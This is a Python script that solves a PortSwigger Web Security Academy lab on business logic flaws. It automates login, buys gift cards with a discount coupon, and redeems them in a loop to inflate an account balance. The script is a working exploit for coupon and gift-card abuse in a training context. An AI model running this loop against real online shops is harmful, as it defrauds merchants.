# A Python script that solves the following lab:
# https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money

# Notes to self:
# Clean Code
# Use same quotation styles
# Organize code
# Make it easier to read
# Rewrite every function
# Handle errors
# Print program proccess to user

from bs4 import BeautifulSoup
import requests
import sys

LAB_SUB_DOMAIN = ""
LAB_URL = "https://" + LAB_SUB_DOMAIN + "." + "web-security-academy.net"

def find_csrf_token(html):
    SOUP = BeautifulSoup(html, "html.parser")
    CSRF_INPUT = SOUP.find("input", {"name" : "csrf"})
    if CSRF_INPUT:
        CSRF_TOKEN = CSRF_INPUT["value"]
        return CSRF_TOKEN
    else:
        return None

def attempt_login():
    LOGIN_PATH = "/login"
    SESSION = requests.Session()
    GET_LOGIN_PAGE = SESSION.get(LAB_URL + LOGIN_PATH)
    LOGIN_HTML = GET_LOGIN_PAGE.text
    CSRF_TOKEN = find_csrf_token(LOGIN_HTML)
    LOGIN_DATA = {"csrf": CSRF_TOKEN, "username": "wiener", "password": "peter"}
    LOGIN_POST_RESPONSE = SESSION.post(LAB_URL + LOGIN_PATH, data = LOGIN_DATA)
    if "Your username is: wiener" in LOGIN_POST_RESPONSE.text:
        print("Login successful!")
        return SESSION
    print("Login failed...")
    return None

def get_balance(html):
    SOUP = BeautifulSoup(html, 'html.parser')
    STRONG_TAG = SOUP.find('strong')
    BALANCE_MESSAGE = STRONG_TAG.text
    DOLLAR_INDEX = BALANCE_MESSAGE.index("$")
    balance_string = BALANCE_MESSAGE[DOLLAR_INDEX+1:]
    balance_string = balance_string.replace(",", "").strip()
    BALANCE = float(balance_string)
    return BALANCE

def send_giftcards_to_cart(session):
    print("Sending giftcards to cart...")
    CART_PATH = "/cart"
    DATA = {"productId": "2", "redir": "PRODUCT", "quantity": "14"}
    session.post(LAB_URL + CART_PATH, data = DATA)
    GET_CART_PAGE = session.get(LAB_URL + CART_PATH)
    CART_PAGE_HTML = GET_CART_PAGE.text
    return CART_PAGE_HTML

def apply_coupon(session, csrf_token):
    DATA = {"csrf": csrf_token, "coupon": "SIGNUP30"}
    session.post(LAB_URL + "/cart/coupon", data = DATA)
    return None

def checkout(session, csrf_token):
    DATA = {"csrf": csrf_token}
    CHECKOUT_RESPONSE = session.post(LAB_URL + "/cart/checkout", data = DATA)
    CHECKOUT_HTML = CHECKOUT_RESPONSE.text
    return CHECKOUT_HTML

def get_gift_card_codes(html):
    GIFT_CARD_CODES = []
    SOUP = BeautifulSoup(html, "html.parser")
    TABLE = SOUP.find('table', class_='is-table-numbers')
    card_number = 1
    for row in TABLE.find_all('tr'):
        cell = row.find('td')
        if cell:
            GIFT_CARD_CODES.append(cell.text.strip())
        if card_number == 14:
            break
        card_number += 1
    return GIFT_CARD_CODES

def claim_gift_cards(session, token, codes):
    for code in codes:
        data = {"csrf": token, "gift-card": code}
        code_response = session.post(LAB_URL + "/my-account/gift-card", data = data)
        print(code_response)
    return None

def add_money(session):
    ACCOUNT_PATH = "/my-account"
    TARGET_PRICE = 2000
    account_balance = 0
    while account_balance < TARGET_PRICE:
        cart_page_html = send_giftcards_to_cart(session)
        cart_page_csrf = find_csrf_token(cart_page_html)
        apply_coupon(session, cart_page_csrf)
        checkout_page_html = checkout(session, cart_page_csrf)
        gift_card_codes = get_gift_card_codes(checkout_page_html)
        print(gift_card_codes)
        claim_gift_cards(session, cart_page_csrf, gift_card_codes) #reusing csrf token?
        GET_MY_ACCOUNT = session.get(LAB_URL + ACCOUNT_PATH)
        MY_ACCOUNT_HTML = GET_MY_ACCOUNT.text
        account_balance = get_balance(MY_ACCOUNT_HTML)
        print(account_balance)
    return account_balance

def main():
    print(f"Program Starting... Target URL: {LAB_URL}")
    SESSION = attempt_login()
    if SESSION == None:
        sys.exit(1)
    NEW_BALANCE = add_money(SESSION)
    print(f"Target price has been reached: {NEW_BALANCE}")
    return 0

if __name__ == "__main__":
    main()
